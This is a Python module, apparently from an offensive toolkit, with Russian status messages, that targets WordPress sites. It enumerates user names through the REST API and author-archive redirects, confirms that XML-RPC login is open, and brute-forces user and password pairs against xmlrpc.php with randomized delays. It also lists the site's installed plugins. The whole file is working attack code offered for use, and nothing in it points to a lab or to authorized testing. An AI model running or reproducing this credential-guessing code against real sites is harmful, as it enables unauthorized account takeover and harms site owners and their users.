# -*- coding: utf-8 -*-
import random
import re
import time

from core import http, ui
from modules import brute

LOGIN = re.compile(r"/author/([a-z0-9._-]{2,30})/", re.I)
JSONL = re.compile(r'"slug"\s*:\s*"([a-z0-9._-]{2,30})"', re.I)
XML = ('<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName>'
       '<params><param><value><string>%s</string></value></param>'
       '<param><value><string>%s</string></value></param></params></methodCall>')


def users(host):
    out = []
    try:
        r = http.get(host, "/wp-json/wp/v2/users?per_page=50", timeout=15)
        if r.status_code == 200:
            out += JSONL.findall(r.text)
    except Exception:
        pass
    for i in range(1, 6):
        try:
            r = http.get(host, "/?author=%d" % i, timeout=12)
        except Exception:
            continue
        loc = r.headers.get("Location") or ""
        m = LOGIN.search(loc) or LOGIN.search(r.text[:5000])
        if m:
            out.append(m.group(1).lower())
        time.sleep(0.3)
    uniq = []
    for u in out:
        u = u.lower()
        if u and u not in uniq and u not in ("admin",):
            uniq.append(u)
    return ["admin"] + uniq if "admin" not in uniq else uniq


def xmlrpc(host):
    try:
        r = http.post(host, "/xmlrpc.php", XML % ("zz", "zz"),
                      ctype="text/xml", timeout=20)
    except Exception:
        return False
    t = r.text.lower()
    return "faultcode" in t and ("password" in t or "username" in t)


def try_pair(host, user, pwd):
    try:
        r = http.post(host, "/xmlrpc.php", XML % (user, pwd), ctype="text/xml", timeout=20)
    except Exception:
        return None
    t = r.text.lower()
    if "faultcode" in t:
        return False
    return "<name>isadmin</name>" in t or "blogid" in t


def run(host, title="", quiet=False):
    if not xmlrpc(host):
        if not quiet:
            ui.say("xmlrpc закрыт")
        return ""
    us = users(host)
    if not quiet:
        ui.say("логины: " + ", ".join(us[:6]))
    words = brute._words(host, title)
    pairs = []
    for u in us[:4]:
        for p in words[:10]:
            pairs.append((u, p))
    for p in words[10:60]:
        pairs.append(("admin", p))
    if not quiet:
        ui.say("пар: %d" % len(pairs))
    for i, (u, p) in enumerate(pairs, 1):
        ok = try_pair(host, u, p)
        if ok:
            if not quiet:
                ui.ok("ПОДОШЛО: %s / %s" % (u, p))
            return "%s:%s" % (u, p)
        if ok is None:
            break
        if not quiet and i % 15 == 0:
            ui.say("проб: %d" % i)
        time.sleep(0.4 + random.random() * 0.4)
    if not quiet:
        ui.say("не подобрал")
    return ""


def plugins(host):
    body = ""
    try:
        r = http.get(host, "/")
        body = r.text.lower()
    except Exception:
        return []
    found = []
    for m in re.findall(r"/wp-content/plugins/([a-z0-9._-]{2,40})/", body):
        if m not in found:
            found.append(m)
    return found[:20]